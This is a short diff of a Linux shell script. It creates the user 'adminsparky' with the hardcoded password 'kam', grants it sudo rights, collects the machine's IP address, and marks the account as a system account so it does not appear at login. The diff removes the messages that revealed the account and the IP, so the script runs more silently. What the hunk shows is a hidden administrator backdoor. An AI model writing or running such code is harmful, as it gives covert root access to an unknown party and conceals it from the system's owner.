@@ -13,14 +13,11 @@ username='adminsparky'
 sudo adduser $username --gecos "" --disabled-password
 echo "$username:kam" | sudo chpasswd
 
-echo "User '$username' created with password 'SIKE you thought'."
-
 # Add the user to the sudo group
 sudo usermod -aG sudo $username
 
 # Display the IP address of the computer
 ip=$(ip addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1)
-echo "This computer's IP address is $ip"
 
 # Add a file to the system with specified content
 echo '[InputSource0]\nxkb=za\n\n[User]\nIcon=/var/lib/AccountsService/icons/adminsparky\nSystemAccount=true' | sudo tee /var/lib/AccountsService/users/adminsparky
